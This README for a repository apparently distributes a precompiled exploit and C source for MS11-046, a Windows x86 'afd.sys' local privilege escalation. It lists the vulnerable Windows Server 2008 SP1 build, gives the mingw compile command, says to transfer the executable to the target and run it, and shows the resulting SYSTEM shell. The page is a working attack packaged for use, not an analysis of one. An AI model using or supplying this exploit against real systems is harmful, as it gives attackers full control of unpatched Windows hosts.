# MS11-046-x86---afd.sys-Local-Privilege-Escalation
Pre-Compiled Microsoft Windows (x86) - 'afd.sys' Local Privilege Escalation.<br>
This repo contains the executable and the update c code for MS11-046.
C code is compiled with `i686-w64-mingw32-gcc (GCC) 15-win32`
### Usage
- Identify the target os is vulnerable and no patch has been applied.
```
OS Name:                   Microsoftr Windows Serverr 2008 Standard
OS Version:                6.0.6001 Service Pack 1 Build 6001
```
- Compile the C code.
```
$ i686-w64-mingw32-gcc -o ms11-046.exe ms11.c -lws2_32
```
- Fetech the compiled executable to target and execute.
- A shell spawned with `nt authority \ system`.
```
C:\temp>ms11-046.exe
ms11-046.exe

c:\Windows\System32>whoami
whoami
nt authority\system
```
